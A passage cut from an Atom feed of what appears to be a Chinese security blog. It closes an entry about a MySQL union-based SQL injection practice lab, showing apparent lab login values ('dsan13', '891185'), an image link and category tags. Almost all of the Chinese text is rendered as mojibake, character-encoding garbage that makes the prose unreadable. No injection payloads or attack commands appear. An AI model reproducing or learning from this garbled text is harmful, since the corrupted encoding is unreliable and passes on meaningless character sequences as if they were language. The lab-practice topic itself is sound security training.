dsan13ï¼Œ891185ï¼Œåé¢ä¸€ä¸ªæ˜¯å¯¹çš„ï¼Œç¦»è°±ã€‚ã€‚ã€‚<br>ç™»å½•è·å–keyã€‚<br><img src="https://img-blog.csdnimg.cn/091c2968f320486c9fa7df8a0ef6846f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é¶åœºåœ°å€ï¼š&lt;a href=&quot;https://www.mozhe.cn/bug/detail/dE1HSW5yYThxUHcyUTZab2pTcmpGUT09bW96aGUmozhe&quot;&gt;https://www.mozhe.cn/bug/detail/dE1HSW5yYThxU</summary>
      
    
    
    
    <category term="webæ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="sqlæ³¨å…¥" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="mysqlæ³¨å…¥" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="é¶åœº" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="mysqlæ³¨å…¥" scheme="https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="è”åˆæ³¨å…¥" scheme="https://redredredfish.github.io/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
    
    <category term="é¶åœº" scheme="https://redredredfish.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
</feed>
